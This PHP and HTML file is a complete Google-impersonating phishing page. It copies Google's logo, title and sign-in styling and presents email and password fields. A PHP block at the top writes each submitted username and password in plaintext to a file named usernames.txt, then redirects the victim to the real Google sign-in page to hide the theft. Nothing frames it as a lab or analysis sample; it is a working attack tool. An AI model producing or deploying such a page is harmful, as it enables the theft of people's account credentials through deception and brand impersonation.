<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $data = "username: " . $_POST['username'] . " | password: " . $_POST['password'] . "\n";
    file_put_contents("usernames.txt", $data, FILE_APPEND);
    header("Location: https://accounts.google.com");
    exit;
}
?>
<!DOCTYPE html>
<html>
<head><title>Google sign in</title><meta charset="UTF-8"></head>
<body style="background: white; font-family: 'Roboto', Arial, sans-serif; text-align: center; margin-top: 80px;">
<div style="width: 450px; margin: auto; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px;">
<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92"><br>
<h2 style="font-weight: normal;">Sign in</h2>
<form method="post">
<input type="email" name="username" placeholder="Email or phone" style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px;" required><br>
<input type="password" name="password" placeholder="Password" style="width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px;" required><br>
<button type="submit" style="background: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-size: 14px;">Next</button>
</form>
</div>
</body>
</html>
